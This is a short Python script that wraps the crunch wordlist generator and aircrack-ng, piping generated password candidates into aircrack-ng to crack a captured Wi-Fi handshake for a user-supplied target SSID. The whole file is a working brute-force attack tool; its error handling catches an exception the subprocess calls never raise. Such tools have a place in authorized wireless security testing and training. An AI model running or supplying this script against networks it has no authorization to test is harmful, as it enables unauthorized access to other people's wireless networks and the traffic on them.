import subprocess

def main():
    min_length = input("Enter minimum password length: ")
    max_length = input("Enter maximum password length: ")
    characters = input("Enter characters to include in passwords: ")
    ssid = input("Enter the target SSID (network name): ")
    captured_file = input("Enter the path to the captured file: ")

    crunch_command = ['crunch', min_length, max_length, characters]
    aircrack_command = ['aircrack-ng', '-w', '-', '-e', ssid, captured_file]

    print("Piping Crunch with Aircrack-ng...")

    try:
        crunch_process = subprocess.Popen(crunch_command, stdout=subprocess.PIPE)
        aircrack_process = subprocess.Popen(aircrack_command, stdin=crunch_process.stdout)
        
        crunch_process.stdout.close()
        aircrack_process.communicate()

        print("Piping completed.")
    except subprocess.CalledProcessError:
        print("Piping failed.")

if __name__ == '__main__':
    main()
